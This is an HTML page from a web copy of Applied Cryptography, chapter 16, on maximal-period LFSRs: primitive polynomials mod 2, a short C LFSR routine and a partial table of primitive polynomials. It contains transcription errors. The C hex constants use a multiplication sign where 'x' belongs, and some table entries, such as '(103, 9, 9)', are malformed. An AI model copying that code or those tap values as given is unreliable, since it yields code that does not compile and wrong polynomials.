@@ -1,0 +1,489 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Pseudo-Random-Sequence Generators and Stream Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=16//-->
+<!--PAGES=374-377//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>In order for a particular LFSR to be a maximal-period LFSR, the polynomial formed from a tap sequence plus the constant 1 must be a primitive polynomial mod 2. The <B>degree</B> of the polynomial is the length of the shift register. A primitive polynomial of degree <I>n</I> is an irreducible polynomial that divides <I>x</I><SUP>2<SUP>n-1</SUP></SUP> &#43; 1, but not <I>x</I><SUP>d</SUP> &#43; 1 for any <I>d</I> that divides 2<SUP>n</SUP> - 1 (see Section 11.3). For the mathematical theory behind all this, consult [643,1649,1648].</P>
+<I><P><A NAME="Fig3"></A><A HREF="javascript:displayWindow('images/16-03.jpg',212,76 )"><IMG SRC="images/16-03t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-03.jpg',212,76)"><FONT COLOR="#000077"><B>Figure 16.3</B></FONT></A>&nbsp;&nbsp;4-bit LFSR.</I>
+</P>
+<P>In general, there is no easy way to generate primitive polynomials mod 2 for a given degree. The easiest way is to choose a random polynomial and test whether it is primitive. This is complicated&#151;something like testing random numbers for primality&#151;but many mathematical software packages do this. See [970,971] for some methods.
+</P>
+<P>Table 16.2 lists some, but by no means all, primitive polynomials mod 2 of varying degrees [1583,643,1649,1648,1272,691]. For example, the listing (32, 7, 5, 3, 2, 1, 0) means that the following polynomial is primitive modulo 2:</P>
+<DL>
+<DD><I>x</I><SUP>32</SUP> &#43; <I>x</I><SUP>7</SUP> &#43; <I>x</I><SUP>5</SUP> &#43; <I>x</I><SUP>3</SUP> &#43; <I>x</I><SUP>2</SUP> &#43; <I>x</I> &#43; 1
+</DL>
+<P>It&#146;s easy to turn this into a maximal-period LFSR. The first number is the length of the LFSR. The last number is always 0 and can be ignored. All the numbers, except the 0, specify the tap sequence, counting from the left of the shift register. That is, low degree terms in the polynomial correspond to taps near the left-hand side of the register.
+</P>
+<P>To continue the example, the listing (32, 7, 5, 3, 2, 1, 0) means that if you take a 32-bit shift register and generate the new bit by XORing the thirty-second, seventh, fifth, third, second, and first bits together (see Figure 16.4), the resultant LFSR will be maximal length; it will cycle through 2<SUP>32</SUP> - 1 values before repeating.</P>
+<P>The C code for this LFSR looks like:</P>
+<!-- CODE //-->
+<PRE>
+int LFSR () {
+     static unsigned long ShiftRegister = 1;
+     /* Anything but 0. */
+     ShiftRegister = ((((ShiftRegister &gt&gt 31)
+                ^ (ShiftRegister &gt&gt 6)
+                ^ (ShiftRegister &gt&gt 4)
+                ^ (ShiftRegister &gt&gt 2)
+                ^ (ShiftRegister &gt&gt 1)
+                ^ ShiftRegister))
+                &amp 0&#215;00000001)
+                &lt&lt 31)
+                | (ShiftRegister &gt&gt 1) ;
+     return ShiftRegister &amp 0&#215;00000001;
+}
+</PRE>
+<!-- END CODE //-->
+<I><P><A NAME="Fig4"></A><A HREF="javascript:displayWindow('images/16-04.jpg',308,69 )"><IMG SRC="images/16-04t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-04.jpg',308,69)"><FONT COLOR="#000077"><B>Figure 16.4</B></FONT></A>&nbsp;&nbsp;32-bit long maximal-length LFSR.</I>
+</P>
+<P>
+</P>
+<TABLE WIDTH="100%"><TH CAPTION ALIGN="CENTER" COLSPAN="4">Table 16.2<BR>Some Primitive Plynomials Mod 2
+<TR>
+<TD COLSPAN="4" ALIGN="LEFT"><HR>
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(36, 11, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(68, 9, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(97, 6, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(36, 6, 5, 4, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(68, 7, 5, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(98, 11, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(37, 6, 4, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(69, 6, 5, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(98, 7, 4, 3, 1, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(4, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(37, 5, 4, 3, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(70, 5, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(99, 7, 5, 4, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(5, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(38, 6, 5, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(71, 6, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(100, 37, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(6, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(39, 4, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(71, 5, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(100, 8, 7, 2, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(7, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(40, 5, 4, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(72, 10, 9, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(101, 7, 6, 1, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(7, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(41, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(72, 6, 4, 3, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(102, 6 5 3 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(8, 4, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(42, 7, 4, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(73, 25, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(103, 9, 9)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(9, 4, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(42, 5, 4, 3, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(73, 4, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(104, 11, 10, 1, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(10, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(43, 6, 4, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(74, 7, 4, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(105, 16, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(11, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(44, 6, 5, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(75, 6, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(106, 15, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(12, 6, 4, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(45, 4, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(76, 5, 4, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(107, 9, 7, 4, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(13, 4, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(46, 8, 7, 6, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(77, 6, 5, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(108, 31, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(14, 5, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(46, 8, 5, 3, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(78, 7, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(109, 5, 4, 2, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(15, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(47, 5, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(79, 9, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(110, 6, 4, 1, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(16, 5, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(48, 9, 7, 4, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(79, 4, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(111, 10, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(17, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(48, 7, 5, 4, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(80, 9, 4, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(111, 49, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(17, 5, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(49, 9, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(80, 7, 5, 3, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(113, 9, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(17, 6, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(49, 6, 5, 4, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(81, 4, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(113, 15, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(18, 7, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(50, 4, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(82, 9, 6, 4, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(113, 30, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(18, 5, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(51, 6, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(82, 8, 7, 6, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(114, 11, 2, 1, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(19, 5, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(52, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(83, 7, 4, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(115, 8, 7, 5, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(20, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(53, 6, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(84, 13, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(116, 6, 5, 2, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(21, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(54, 8, 6, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(84, 8, 7, 5, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(117, 5, 2, 1, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(22, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(54, 6, 5, 4, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(85, 8, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(118, 33, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(23, 5, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(55, 24, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(86, 6, 5, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(119, 8, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(24, 4, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(55, 6, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(87, 13, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(119, 45, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(25, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(56, 7, 4, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(87, 7, 5, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(120, 9, 6, 2, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(26, 6, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(57, 7, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(88, 11, 9, 8, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(121, 18, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(27, 5, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(57, 5, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(88, 8, 5, 4, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(122, 6, 2, 1, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(28, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(58, 19, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(89, 38, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(123, 2, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(29, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(58, 6, 5, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(89, 51, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(124, 37, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(30, 6, 4, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(59, 7, 4, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(89, 6, 5, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(125, 7, 6, 5, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(31, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(59, 6, 5, 4, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(90, 5, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(126, 7, 4, 2, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(31, 6, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(60, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(91, 8, 5, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(127, 1, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(31, 7, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(61, 5, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(91, 7, 6, 5, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(127, 7, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(31, 13, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(62, 6, 5, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(92, 6, 5, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(127, 63, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(32, 7, 6, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(63, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(93, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(128, 7, 2, 1, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(32, 7, 5, 3, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(64, 4, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(94, 21, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(129, 5, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(33, 13, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(65, 18, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(94, 6, 5, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(130, 3, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(33, 16, 4, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(65, 4, 3, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(95, 11, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(131, 8, 3, 2, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(34, 8, 4, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(66, 9, 8, 6, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(95, 6, 5, 4, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(132, 29, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(34, 7, 6, 5, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(66, 8, 6, 5, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(96, 10, 9, 6, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(133, 9, 8, 2, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(35, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(67, 5, 2, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(96, 7, 6, 4, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(134, 57, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(135, 11, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(152, 6, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(178, 87, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(270, 133, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(135, 16, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(153, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(183, 56, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(282, 35, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(135, 22, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(153, 8, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(194, 87, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(282, 43, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(136, 8, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(154, 9, 5, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(198, 65, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(286, 69, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(137, 21, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(155, 7, 5, 4, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(201, 14, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(286, 73, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(138, 8, 7, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(156, 9, 5, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(201, 17, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(294, 61, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(139, 8, 5, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(157, 6, 5, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(201, 59, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(322, 67, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(140, 29, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(158, 8, 6, 5, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(201, 79, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(333, 2, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(141, 13, 6, 1, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(159, 31, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(202, 55, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(350, 53, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(142, 21, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(159, 34, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(207, 43, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(366, 29, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(143, 5, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(159, 40, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(212, 105, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(378, 43, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(144, 7, 4, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(160, 5, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(218, 11, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(378, 107, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(145, 52, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(161, 18, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(218, 15, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(390, 89, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(145, 69, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(161, 39, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(218, 71, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(462, 73, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(146, 5, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(161, 60, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(218, 83, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(521, 32, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(147, 11, 4, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(162, 8, 7, 4, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(225, 32, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(521, 48, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(148, 27, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(163, 7, 6, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(225, 74, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(521, 158, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(149, 10, 9, 7, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(164, 12, 6, 5, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(225, 88, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(521, 168, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(150, 53, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(165, 9, 8, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(225, 97, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(607, 105, 0)
+<TR>
